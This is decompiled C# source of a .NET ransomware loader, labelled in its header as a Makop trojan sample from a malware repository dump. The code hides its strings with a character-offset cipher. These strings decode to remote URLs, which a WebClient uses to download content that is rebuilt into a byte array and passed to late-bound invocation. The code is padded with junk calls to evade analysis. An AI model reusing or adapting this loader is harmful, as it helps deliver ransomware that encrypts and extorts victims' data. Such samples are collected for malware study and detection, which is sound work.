// Decompiled with JetBrains decompiler
// Type: VrIAtfsNpaoqeXG.JdKxzqLFHnpsCKXOINAdXrj
// Assembly: pPjvicbIDslRTIOgcnZsfyw, Version=3.297.896.450, Culture=neutral, PublicKeyToken=null, ProcessorArchitecture=X86
// MVID: C2F3208F-9A72-4C78-BEE1-6456FF6A5CB5
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan-Ransom.MSIL.Makop.gen-0ed05e4be5376f0cf391a78afc7a3114ffbfa064348fb66cd93e8ee6f6b27fe1.exe

using AqMUtADiRpuNwJsAPdafQZHt;
using Microsoft.VisualBasic;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;

namespace VrIAtfsNpaoqeXG
{
  internal class JdKxzqLFHnpsCKXOINAdXrj
  {
    public static object[] QZiajPUfsVczxyKXOwDq()
    {
      Debug.Write("FheknTbPMtiLWYHChoFsitDUzaNmABYkAOMdFTxVdBNRTLXHE");
      Debug.Write("SDnMdvmEjKngPoluYlhlDWoRKoGMaOdfHIX");
      Debug.WriteLine("KxwtAzvikOomBwVzPwbVpwbOG");
      Debug.Write("SjWjaiGnJAPOKeAfHWatepfonJGMIovIEUHma");
      Path.Combine("C:\\OgFnMuKaLWvj\\", "PfNuBCdHWqCUFvegkQwnSGhUOQDKEnYJrzpUjs");
      Debug.WriteLine("ejFexDKIrqDPUAhqiYTGKZscIsTD");
      MemoryStream memoryStream = new MemoryStream();
      Path.Combine("C:\\gWOmbxsenCJqdimuaxdjiqraCIfQC\\", "vfKhCuBrOxhcdFoCDCMYbk");
      string str1 = QYZWzlnJPjgoGbiXgWXVmzUcveDGZIZq.ZPHcnUKMGL.ToString();
      char[] chArray = new char[1]
      {
        Convert.ToChar(JdKxzqLFHnpsCKXOINAdXrj.TuxGTkyKLNVTrFvDKaqCsQtblbQl())
      };
      foreach (string str2 in str1.Split(chArray))
      {
        if (str2.Length > 0)
        {
          VBMath.Randomize();
          Application.DoEvents();
          Debug.Write("oKuXFwlyPmoKhEFWFRSJGbgfLdxZfsRBlRaNEP");
          Debug.Write("efqHVOsyJXHWVgsBHInSTtNyJTxjVNFibN");
          Application.AddMessageFilter((IMessageFilter) null);
          Application.DoEvents();
          memoryStream.WriteByte((byte) Convert.ToInt32(str2));
        }
      }
      Application.AddMessageFilter((IMessageFilter) null);
      return new object[1]
      {
        (object) memoryStream.ToArray()
      };
    }

    public void VyfwNovqNtdMBuwRiXhrHREbkjvBtOfYhBqxSmPqftaKd(
      string[] IFWIsyKngyEjnlgsSJYvDmSfuqLhRmnRTXCEyT)
    {
      Debug.WriteLine("DsYfsMntAsjxLjJjrzMWLsSYbrjCWsyUTsO");
      Application.DoEvents();
      Application.AddMessageFilter((IMessageFilter) null);
      Debug.Write("iJCUfGZmgzwLalEnIpfb");
      VBMath.Randomize();
      QYZWzlnJPjgoGbiXgWXVmzUcveDGZIZq.JGCulrnEUzaOJthMq jgCulrnEuzaOjthMq = (QYZWzlnJPjgoGbiXgWXVmzUcveDGZIZq.JGCulrnEUzaOJthMq) new JdKxzqLFHnpsCKXOINAdXrj();
      VBMath.Randomize();
      Debug.Write("lAaebDKxiUoDtuAOFGpMf");
      Debug.Write("MyFjqsePFOqCIyTCWCemkSsF");
      Debug.Write("KdydIQpgOBzvutedeIPcSRqMetkbAnM");
      Path.Combine("C:\\nDGoGLXbwUhZxiCxahBdpNSmhrExeonNiQNQw\\", "tLRbvXKroWQNasLIXQNbzusAWrGTlosPHDOQmorUCQcIGreV");
    }

    public JdKxzqLFHnpsCKXOINAdXrj()
      : this()
    {
    }

    static JdKxzqLFHnpsCKXOINAdXrj()
    {
      QYZWzlnJPjgoGbiXgWXVmzUcveDGZIZq.AWdEnkeOcAJDCHtWKdfHvgFmBLfFXWmi = new WebClient();
      QYZWzlnJPjgoGbiXgWXVmzUcveDGZIZq.ZPHcnUKMGL = new StringBuilder();
      QYZWzlnJPjgoGbiXgWXVmzUcveDGZIZq.RLAiugbsbsTgfQxsMyZifEnBdMZrJQt = (QYZWzlnJPjgoGbiXgWXVmzUcveDGZIZq.DkjqwhJZjMYLDJdGptQPStwiDKQPgEPtJpLqGwACTmYX) new JdKxzqLFHnpsCKXOINAdXrj();
    }

    private static void JYNEOatHclsLXmVhBcI(
      string[] SmvgVbOSoLXjBIMLWGiDarjZXUdhaVOkCTMfnRCZheV)
    {
      new JdKxzqLFHnpsCKXOINAdXrj().VyfwNovqNtdMBuwRiXhrHREbkjvBtOfYhBqxSmPqftaKd(new string[1]
      {
        QYZWzlnJPjgoGbiXgWXVmzUcveDGZIZq.DkjqwhJZjMYLDJdGptQPStwiDKQPgEPtJpLqGwACTmYX.hnAJZULHorTlYuyTNVXTtyUmADWrslJdKOfqzkbxTFm()
      });
    }

    public JdKxzqLFHnpsCKXOINAdXrj()
      : this()
    {
    }

    public IntPtr OfMTfEeMuGYXVDSVBqAhTfxiKEZzxLRLyT()
    {
      Debug.Write("BelZOXYsqfdrQfaDagwEVwIyTzIrKTEnLrhdsPSGP");
      Path.Combine("C:\\xVjoCLKceGlHqGICAgopHIxAQGzYXlnQPyBz\\", "kqNXpGntFuLyASIDqiPxIxWlMeTvXQBhdpQArcjh");
      Debug.Write("kmOzwsCJzGJdQNtBlkMSvPSDrxCScZ");
      Debug.WriteLine("QNoBmKxnHASoq");
      Debug.WriteLine("UydmCwYgprLvtkhZQJGAQWPoAJeYDmZhyXfolZvdTJxWPRq");
      string str1 = JdKxzqLFHnpsCKXOINAdXrj.sKWOuIwuOTuNImqFvPUpACEcawvIiHzhWCjuQbUoGBIX();
      Path.Combine("C:\\mfIJiHQeBoXcNUiDcrEWvfTORoDGgySyIsRSUCQzHTDZnXIj\\", "LguFlUVhlUSUejYdvytudpI");
      using (List<string>.Enumerator enumerator = new List<string>()
      {
        JdKxzqLFHnpsCKXOINAdXrj.PUFGaqnqQfrMtmaLGmVFLKhlEOZbUaWHZpHAdBG(),
        JdKxzqLFHnpsCKXOINAdXrj.GLdceHInUwcxZeNtcmqmwPjKNdFzIe()
      }.GetEnumerator())
      {
label_10:
        while (enumerator.MoveNext())
        {
          string current = enumerator.Current;
          while (true)
          {
            try
            {
              Application.DoEvents();
              string str2 = (string) ((JdKxzqLFHnpsCKXOINAdXrj) QYZWzlnJPjgoGbiXgWXVmzUcveDGZIZq.RLAiugbsbsTgfQxsMyZifEnBdMZrJQt).ZdKBSqrlRsJNbMqUTFXFcnXNaSoWFvzl(1, 2, (object) QYZWzlnJPjgoGbiXgWXVmzUcveDGZIZq.AWdEnkeOcAJDCHtWKdfHvgFmBLfFXWmi, JdKxzqLFHnpsCKXOINAdXrj.LfYdizgqNZfAEBpCNJzuSH().Replace(JdKxzqLFHnpsCKXOINAdXrj.UsrEdNlQRqMUfKlCfZywJIflOcMZFkUeVciPiCn(), string.Empty), QYZWzlnJPjgoGbiXgWXVmzUcveDGZIZq.SbKoUMsrZDEUTpsKREVimNxGnyZfHgKJlZAfuBDGtgaEA._0000000, (object) current);
              if (str2.StartsWith(JdKxzqLFHnpsCKXOINAdXrj.pJoOvwdxWoSiMmlmfQabmkGvHYdBvuDMyIuZQwsGICJWb()))
              {
                Debug.Write("AfpBCTAUFtVZdnOwK");
                str2 = str2.Replace(JdKxzqLFHnpsCKXOINAdXrj.QWDcMmYBfcSgxtBbBKfJdSmv(), JdKxzqLFHnpsCKXOINAdXrj.usKBJuLPmFSsRzhoWYpVnhAhlWmfYK()).Replace(JdKxzqLFHnpsCKXOINAdXrj.pSGRDtyvHgWjTFjWDpxtBgljtyzJnVLY(), JdKxzqLFHnpsCKXOINAdXrj.TqLDzUngkrYrqdjv());
                for (int index = 0; index < 10; ++index)
                {
                  char oldChar = str1[index];
                  Path.Combine("C:\\HaKVvyVzDODngvxUegFtErtYpKoYZikF\\", "YtIPEJQGcpMqsnACjihidfpHMGLkWAvDY");
                  char newChar = Convert.ToChar(index.ToString());
                  Debug.WriteLine("pNPezwOMCbHIWwNwQadwUnsbdYGKBUirdA");
                  str2 = str2.Replace(oldChar, newChar).Replace(oldChar, newChar).Replace(oldChar, newChar);
                }
              }
              QYZWzlnJPjgoGbiXgWXVmzUcveDGZIZq.ZPHcnUKMGL.Append(str2);
              goto label_10;
            }
            catch (Exception ex)
            {
            }
          }
        }
      }
      return IntPtr.Zero;
    }

    public JdKxzqLFHnpsCKXOINAdXrj()
      : this()
    {
    }

    public JdKxzqLFHnpsCKXOINAdXrj()
      : this()
    {
      this.\u003CXKqAXhNUlEGZpZkpjhPYjWcNHlyzjFBi();
    }

    [CompilerGenerated]
    public void \u003CXKqAXhNUlEGZpZkpjhPYjWcNHlyzjFBi()
    {
      // ISSUE: The method is too long to display (150575 instructions)
    }

    public object ZdKBSqrlRsJNbMqUTFXFcnXNaSoWFvzl(
      int EGfnxiRWcDEJOlZstZsWPNOSyzXUNon,
      int QifkGrAxlrVjvidcXnbzTHRsyuPXlWjOpOAJbsM,
      object CzVLySFxpwUXzmOWBoRilBClohgUGHubFAZYWsATXABqZKB,
      string ARZujAWJxrL,
      QYZWzlnJPjgoGbiXgWXVmzUcveDGZIZq.SbKoUMsrZDEUTpsKREVimNxGnyZfHgKJlZAfuBDGtgaEA KQHcTsZnOYEVrpnabVoxFtOI,
      params object[] ZRvZycozbPigSywGKnMSuzRUnAVO)
    {
      Path.Combine("C:\\RoavSgDvjwoCsPdfOtJuMCBOBPucBeWbApcRQovIF\\", "OsBzmkzGgIZdWR");
      Application.DoEvents();
      Debug.Write("oMmUdMBUezmcMmoz");
      Application.AddMessageFilter((IMessageFilter) null);
      Debug.WriteLine("XbPYkaoEUvuwXYEyOfEusVdTn");
      Debug.Write("bnjhNuSibgSeLYFySfAIBnyEYgJfFfLeWZafwhbCnVWxGJuGP");
      int int32;
      if (KQHcTsZnOYEVrpnabVoxFtOI == QYZWzlnJPjgoGbiXgWXVmzUcveDGZIZq.SbKoUMsrZDEUTpsKREVimNxGnyZfHgKJlZAfuBDGtgaEA._0000000)
      {
        Debug.WriteLine("UdYtEAZLDOnidwWuNhMXzbLdXvFqbXoMcpKcNLrzauSsOtjz");
        Debug.Write("acSBHJpSrUvjUJ");
        Application.DoEvents();
        Debug.Write("FAfNLTHcQnWfit");
        Path.Combine("C:\\pDlgqYfMetaSKTpiErK\\", "mRnwNgvPLuMjKYERXNsLANvMTjOM");
        Application.DoEvents();
        int32 = Convert.ToInt32(QYZWzlnJPjgoGbiXgWXVmzUcveDGZIZq.JGCulrnEUzaOJthMq.bqQuRgJlRc());
      }
      else
      {
        VBMath.Randomize();
        VBMath.Randomize();
        Debug.WriteLine("HIEvVBcqPtjD");
        Path.Combine("C:\\paKGRiLoxkRZYMeRBJUXGdLiOxCBh\\", "ujikMLfVLxzoxQFwjxkOgylWmXYydtoM");
        Path.Combine("C:\\VdxPQCrgwNjAhOGVDrFarNbVXmY\\", "PMHSriNtPFHferspKPyqdULOnvibBREDBtPVSrt");
        Debug.Write("vmBNMYUmvJGmwzJMhCUslsSXbdELCxsvdChZQsi");
        int32 = Convert.ToInt32(QYZWzlnJPjgoGbiXgWXVmzUcveDGZIZq.DkjqwhJZjMYLDJdGptQPStwiDKQPgEPtJpLqGwACTmYX.zeNfhXfGXBNUcy());
      }
      Application.DoEvents();
      Debug.WriteLine("MsVFhdbKdOqxbjUJQLUqBTmjTbwgEiL");
      Application.AddMessageFilter((IMessageFilter) null);
      Debug.Write("CjyaWsTZCazIgVtTjTqoVcHTgMLgHFDyGEVSKTMyRVNAt");
      Debug.WriteLine("DcYHDmnoTPzBFUkHNsWxbcCaBiphSwaohzCKNydsqkMPvq");
      Path.Combine("C:\\fZBQeDRdsAzXgvXgvxPktgrAUoDgRqMFkdpFbr\\", "wxegckPrIvkOoakWYIaWPonWBjMr");
      return Interaction.CallByName(CzVLySFxpwUXzmOWBoRilBClohgUGHubFAZYWsATXABqZKB, ARZujAWJxrL, (CallType) int32, ZRvZycozbPigSywGKnMSuzRUnAVO);
    }

    public JdKxzqLFHnpsCKXOINAdXrj()
      : this()
    {
    }

    static JdKxzqLFHnpsCKXOINAdXrj()
    {
    }

    public static string TuxGTkyKLNVTrFvDKaqCsQtblbQl()
    {
      string source = "\uF07D";
      string str = "61449";
      StringBuilder stringBuilder = new StringBuilder();
      try
      {
        foreach (char ch in source.ToList<char>())
        {
          int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
          stringBuilder.Append(char.ConvertFromUtf32(utf32));
        }
      }
      finally
      {
        List<char>.Enumerator enumerator;
        enumerator.Dispose();
      }
      return stringBuilder.ToString();
    }

    public static string sKWOuIwuOTuNImqFvPUpACEcawvIiHzhWCjuQbUoGBIX()
    {
      string source = "햞핷핺핿햁햒햢햝향핹";
      string str = "54572";
      StringBuilder stringBuilder = new StringBuilder();
      try
      {
        foreach (char ch in source.ToList<char>())
        {
          int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
          stringBuilder.Append(char.ConvertFromUtf32(utf32));
        }
      }
      finally
      {
        List<char>.Enumerator enumerator;
        enumerator.Dispose();
      }
      return stringBuilder.ToString();
    }

    public static string PUFGaqnqQfrMtmaLGmVFLKhlEOZbUaWHZpHAdBG()
    {
      string source = "롟롫롫롧렱렦렦롚롦롩롦롣롦롙롦롯롦롩롦롱롦롩력롚롦롤렦롙롘롪로렦렰련련렻렬렫렩령렸렬렬렰렰렸렭렼렼렬렯령렼렻렪련렫렸렮렸렽렮렧렺력롟롫롤롣";
      string str = "47095";
      StringBuilder stringBuilder = new StringBuilder();
      try
      {
        foreach (char ch in source.ToList<char>())
        {
          int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
          stringBuilder.Append(char.ConvertFromUtf32(utf32));
        }
      }
      finally
      {
        List<char>.Enumerator enumerator;
        enumerator.Dispose();
      }
      return stringBuilder.ToString();
    }

    public static string GLdceHInUwcxZeNtcmqmwPjKNdFzIe()
    {
      string source = "\uE22E\uE23A\uE23A\uE236\uE200\uE1F5\uE1F5\uE229\uE235\uE238\uE235\uE232\uE235\uE228\uE235\uE23E\uE235\uE238\uE235\uE240\uE235\uE238\uE1F4\uE229\uE235\uE233\uE1F5\uE228\uE227\uE239\uE22B\uE1F5\uE209\uE1FE\uE207\uE20A\uE1FA\uE20B\uE1F9\uE1F7\uE1F6\uE1FF\uE1FA\uE1FE\uE1FF\uE1FA\uE1FE\uE1FB\uE1FB\uE1FA\uE1F8\uE1F6\uE1F7\uE1FC\uE1F8\uE20B\uE20A\uE1FD\uE1FE\uE209\uE1FF\uE1FB\uE1FA\uE1FA\uE1F4\uE22E\uE23A\uE233\uE232";
      string str = "57798";
      StringBuilder stringBuilder = new StringBuilder();
      try
      {
        foreach (char ch in source.ToList<char>())
        {
          int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
          stringBuilder.Append(char.ConvertFromUtf32(utf32));
        }
      }
      finally
      {
        List<char>.Enumerator enumerator;
        enumerator.Dispose();
      }
      return stringBuilder.ToString();
    }

    public static string LfYdizgqNZfAEBpCNJzuSH()
    {
      string source = "별별별벐별별별벻별별별볃별별별벺별별별벸별별벻별별벭별벰별벟별변별벾별벵별별벺별별벳별";
      string str = "48204";
      StringBuilder stringBuilder = new StringBuilder();
      try
      {
        foreach (char ch in source.ToList<char>())
        {
          int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
          stringBuilder.Append(char.ConvertFromUtf32(utf32));
        }
      }
      finally
      {
        List<char>.Enumerator enumerator;
        enumerator.Dispose();
      }
      return stringBuilder.ToString();
    }

    public static string UsrEdNlQRqMUfKlCfZywJIflOcMZFkUeVciPiCn()
    {
      string source = "\uEC81";
      string str = "60425";
      StringBuilder stringBuilder = new StringBuilder();
      try
      {
        foreach (char ch in source.ToList<char>())
        {
          int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
          stringBuilder.Append(char.ConvertFromUtf32(utf32));
        }
      }
      finally
      {
        List<char>.Enumerator enumerator;
        enumerator.Dispose();
      }
      return stringBuilder.ToString();
    }

    public static string pJoOvwdxWoSiMmlmfQabmkGvHYdBvuDMyIuZQwsGICJWb()
    {
      string source = "쒗쓋쒙";
      string str = "50267";
      StringBuilder stringBuilder = new StringBuilder();
      try
      {
        foreach (char ch in source.ToList<char>())
        {
          int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
          stringBuilder.Append(char.ConvertFromUtf32(utf32));
        }
      }
      finally
      {
        List<char>.Enumerator enumerator;
        enumerator.Dispose();
      }
      return stringBuilder.ToString();
    }

    public static string QWDcMmYBfcSgxtBbBKfJdSmv()
    {
      string source = "⸣\u2E57⸥";
      string str = "11751";
      StringBuilder stringBuilder = new StringBuilder();
      try
      {
        foreach (char ch in source.ToList<char>())
        {
          int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
          stringBuilder.Append(char.ConvertFromUtf32(utf32));
        }
      }
      finally
      {
        List<char>.Enumerator enumerator;
        enumerator.Dispose();
      }
      return stringBuilder.ToString();
    }

    public static string usKBJuLPmFSsRzhoWYpVnhAhlWmfYK()
    {
      string source = "";
      string str = "29496";
      StringBuilder stringBuilder = new StringBuilder();
      try
      {
        foreach (char ch in source.ToList<char>())
        {
          int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
          stringBuilder.Append(char.ConvertFromUtf32(utf32));
        }
      }
      finally
      {
        List<char>.Enumerator enumerator;
        enumerator.Dispose();
      }
      return stringBuilder.ToString();
    }

    public static string pSGRDtyvHgWjTFjWDpxtBgljtyzJnVLY()
    {
      string source = "忇徺忻忉";
      string str = "24459";
      StringBuilder stringBuilder = new StringBuilder();
      try
      {
        foreach (char ch in source.ToList<char>())
        {
          int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
          stringBuilder.Append(char.ConvertFromUtf32(utf32));
        }
      }
      finally
      {
        List<char>.Enumerator enumerator;
        enumerator.Dispose();
      }
      return stringBuilder.ToString();
    }

    public static string TqLDzUngkrYrqdjv()
    {
      string source = "";
      string str = "42145";
      StringBuilder stringBuilder = new StringBuilder();
      try
      {
        foreach (char ch in source.ToList<char>())
        {
          int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
          stringBuilder.Append(char.ConvertFromUtf32(utf32));
        }
      }
      finally
      {
        List<char>.Enumerator enumerator;
        enumerator.Dispose();
      }
      return stringBuilder.ToString();
    }

    public static string aNLvHjVaWYSbxkrYpGRLYyoaSvgivASzbYOVyIBIyYp()
    {
      string source = "넜냫넜넜넜넉넜넜넘넜넜냸넜넝넜넔넜넉넜";
      string str = "45220";
      StringBuilder stringBuilder = new StringBuilder();
      try
      {
        foreach (char ch in source.ToList<char>())
        {
          int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
          stringBuilder.Append(char.ConvertFromUtf32(utf32));
        }
      }
      finally
      {
        List<char>.Enumerator enumerator;
        enumerator.Dispose();
      }
      return stringBuilder.ToString();
    }
  }
}
